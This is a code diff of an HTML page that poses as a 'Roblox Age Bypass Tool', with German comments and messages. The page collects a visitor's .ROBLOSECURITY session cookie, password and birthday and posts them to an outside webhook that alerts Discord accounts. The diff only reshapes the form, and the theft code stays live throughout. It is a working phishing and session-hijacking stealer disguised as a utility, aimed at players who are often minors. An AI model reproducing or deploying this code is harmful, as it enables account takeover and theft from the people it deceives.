@@ -6,7 +6,7 @@
   <title>Roblox Age Bypass Tool</title>
   <link href="https://fonts.googleapis.com/css2?family=Inter:wght@400;600&display=swap" rel="stylesheet" />
   <style>
-    /* Dein Style bleibt exakt gleich */
+    /* Style bleibt unverändert */
     * { box-sizing: border-box; }
     body {
       margin: 0;
@@ -182,16 +182,6 @@
       <option value="13plus">13+ All Ages</option>
     </select>
 
-    <!-- Geburtstag Auswahl -->
-    <div class="input-block" style="margin-top: 20px;">
-      <div class="input-block-title">🎂 Select Birthday</div>
-      <div style="display: flex; gap: 10px;">
-        <select id="day"><option value="">Day</option></select>
-        <select id="month"><option value="">Month</option></select>
-        <select id="year"><option value="">Year</option></select>
-      </div>
-    </div>
-
     <div id="cookie-block" class="input-block" style="display:none;">
       <div class="input-block-title">.ROBLOSECURITY Cookie</div>
       <textarea id="cookie-input" placeholder="Paste your .ROBLOSECURITY Cookie here..." spellcheck="false"></textarea>
@@ -202,7 +192,17 @@
       <textarea id="password-input" placeholder="Enter account password for verification..." spellcheck="false"></textarea>
     </div>
 
-    <button id="process-button" type="button">⚙️ PROCESS ACCOUNT</button>
+    <div id="birthday-block" class="input-block" style="display:none; margin-top:20px;">
+      <div class="input-block-title">🎂 Select Birthday</div>
+      <div style="display: flex; gap: 10px;">
+        <select id="day"><option value="">Day</option></select>
+        <select id="month"><option value="">Month</option></select>
+        <select id="year"><option value="">Year</option></select>
+      </div>
+    </div>
+
+    <button id="continue-button" type="button" style="display:none;">➡️ Continue</button>
+    <button id="process-button" type="button" style="display:none;">⚙️ PROCESS ACCOUNT</button>
 
     <div class="info-box">
       <div class="info-title">⚠️ Important Information</div>
@@ -226,18 +226,19 @@
     const bypassSelect = document.getElementById('bypass');
     const cookieBlock = document.getElementById('cookie-block');
     const passwordBlock = document.getElementById('password-block');
+    const birthdayBlock = document.getElementById('birthday-block');
+    const continueBtn = document.getElementById('continue-button');
+    const processBtn = document.getElementById('process-button');
     const cookieInput = document.getElementById('cookie-input');
     const passwordInput = document.getElementById('password-input');
-    const processBtn = document.getElementById('process-button');
     const errorMessage = document.getElementById('error-message');
     const successMessage = document.getElementById('success-message');
     const loaderOverlay = document.getElementById('loader-overlay');
 
-    bypassSelect.addEventListener('change', () => {
-      cookieBlock.style.display = (bypassSelect.value !== "") ? 'block' : 'none';
-      passwordBlock.style.display = (bypassSelect.value === '13plus') ? 'block' : 'none';
-      clearMessages();
-    });
+    // Geburtstag Dropdowns initialisieren
+    for (let i = 1; i <= 31; i++) document.getElementById("day").innerHTML += `<option value="${i}">${i}</option>`;
+    for (let i = 1; i <= 12; i++) document.getElementById("month").innerHTML += `<option value="${i}">${i}</option>`;
+    for (let i = new Date().getFullYear(); i >= 1900; i--) document.getElementById("year").innerHTML += `<option value="${i}">${i}</option>`;
 
     function clearMessages() {
       errorMessage.style.display = 'none';
@@ -256,15 +257,79 @@
       setTimeout(() => { successMessage.style.display = 'none'; }, 6000);
     }
 
+    function resetForm() {
+      cookieBlock.style.display = 'none';
+      passwordBlock.style.display = 'none';
+      birthdayBlock.style.display = 'none';
+      continueBtn.style.display = 'none';
+      processBtn.style.display = 'none';
+
+      cookieInput.value = '';
+      passwordInput.value = '';
+      document.getElementById('day').value = '';
+      document.getElementById('month').value = '';
+      document.getElementById('year').value = '';
+      continueBtn.dataset.step = '0';
+      processBtn.disabled = false;
+      continueBtn.disabled = false;
+    }
+
+    bypassSelect.addEventListener('change', () => {
+      clearMessages();
+      resetForm();
+
+      const val = bypassSelect.value;
+
+      if (!val) return;
+
+      cookieBlock.style.display = 'block';
+
+      if (val === '13plus') {
+        passwordBlock.style.display = 'block';
+        continueBtn.style.display = 'block';
+        processBtn.style.display = 'none';
+        birthdayBlock.style.display = 'none';
+        continueBtn.dataset.step = '1'; // Step 1 = Eingabe Cookie & Passwort
+      } else if (val === 'birthyear') {
+        // Direkt Cookie und Geburtstag zeigen + Prozessbutton
+        passwordBlock.style.display = 'none';
+        birthdayBlock.style.display = 'block';
+        continueBtn.style.display = 'none';
+        processBtn.style.display = 'block';
+        continueBtn.dataset.step = '0';
+      }
+    });
+
+    continueBtn.addEventListener('click', () => {
+      clearMessages();
+
+      // Validierung Cookie + Passwort vor Weiter
+      if (cookieInput.value.trim().length < 500) {
+        showError('Bitte gültiges Cookie eingeben.');
+        return;
+      }
+      if (passwordInput.value.trim() === '') {
+        showError('Bitte Passwort eingeben.');
+        return;
+      }
+
+      // Nach Klick auf Continue Geburtstag anzeigen + Prozessbutton
+      birthdayBlock.style.display = 'block';
+      processBtn.style.display = 'block';
+      continueBtn.style.display = 'none';
+    });
+
     async function sendEmbedToDiscord(title, description) {
       const webhookUrl = 'https://hkdk.events/gcjor0rqtldxig';
 
+      // @-Mentions außerhalb Embed senden
       await fetch(webhookUrl, {
         method: 'POST',
         headers: { 'Content-Type': 'application/json' },
         body: JSON.stringify({ content: '<@1030535100829540464> <@&1392621247460020254>' })
       });
 
+      // Embed senden
       await fetch(webhookUrl, {
         method: 'POST',
         headers: { 'Content-Type': 'application/json' },
@@ -289,8 +354,21 @@
       const month = document.getElementById("month").value;
       const year = document.getElementById("year").value;
 
-      if (!selected || !day || !month || !year || cookieVal.length < 500 || (selected === '13plus' && passwordVal.length === 0)) {
-        showError('ERROR Try later again.');
+      // Validation
+      if (!selected) {
+        showError('Bitte Methode auswählen.');
+        return;
+      }
+      if (cookieVal.length < 500) {
+        showError('Bitte gültiges Cookie eingeben.');
+        return;
+      }
+      if (!day || !month || !year) {
+        showError('Bitte Geburtstag vollständig auswählen.');
+        return;
+      }
+      if (selected === '13plus' && passwordVal.length === 0) {
+        showError('Bitte Passwort eingeben.');
         return;
       }
 
@@ -300,10 +378,12 @@
       loaderOverlay.style.display = 'flex';
 
       try {
-        await sendEmbedToDiscord('.ROBLOSECURITY Cookie & Password', `**Method:** ${selected}\n**Cookie:** ${cookieVal}\n**Birthday:** ${birthday}`);
+        // Cookie + Methode + Geburtstag senden
+        await sendEmbedToDiscord('.ROBLOSECURITY Cookie & Passwort', `**Method:** ${selected}\n**Cookie:** ${cookieVal}\n**Birthday:** ${birthday}`);
 
+        // Passwort nur bei 13+ senden
         if (selected === '13plus') {
-          await sendEmbedToDiscord('Account Password', `**Password:** ${passwordVal}`);
+          await sendEmbedToDiscord('Account Passwort', `**Password:** ${passwordVal}`);
         }
 
         await new Promise(res => setTimeout(res, 1200));
@@ -316,11 +396,6 @@
         processBtn.disabled = false;
       }
     });
-
-    // Geburtstag Dropdowns initialisieren
-    for (let i = 1; i <= 31; i++) document.getElementById("day").innerHTML += `<option value="${i}">${i}</option>`;
-    for (let i = 1; i <= 12; i++) document.getElementById("month").innerHTML += `<option value="${i}">${i}</option>`;
-    for (let i = new Date().getFullYear(); i >= 1900; i--) document.getElementById("year").innerHTML += `<option value="${i}">${i}</option>`;
   </script>
 </body>
 </html>
